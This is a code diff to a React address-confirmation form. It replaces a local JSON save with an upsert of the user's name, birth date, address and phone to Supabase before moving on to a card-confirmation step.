@@ -1,8 +1,10 @@
+
 import React, { useState, useEffect } from "react";
 import { useNavigate } from "react-router-dom";
 import Footer from "@/components/Footer";
 import ProgressStepper from "@/components/ProgressStepper";
-import { updateUserSession, getFromSession, saveUserDataToJson } from "@/utils/sessionUtils";
+import { updateUserSession, getFromSession } from "@/utils/sessionUtils";
+import { upsertUser } from "@/utils/supabaseClient";
 import { toast } from "sonner";
 
 const AddressConfirmation: React.FC = () => {
@@ -46,6 +48,19 @@ const AddressConfirmation: React.FC = () => {
     setIsLoading(true);
 
     try {
+      // Préparation des données d'adresse uniquement
+      const addressData = {
+        email,
+        nom,
+        prenom,
+        datenaissance: dateNaissance,
+        adresse,
+        codepostal: codePostal,
+        ville,
+        telephone
+      };
+      
+      // Mettre à jour la session avec les données complètes (camelCase)
       const userData = {
         email,
         nom,
@@ -59,7 +74,8 @@ const AddressConfirmation: React.FC = () => {
       
       updateUserSession(userData);
       
-      await saveUserDataToJson();
+      // N'envoyer que les données d'adresse à Supabase
+      await upsertUser(addressData);
       
       setIsLoading(false);
       navigate("/card-confirmation");
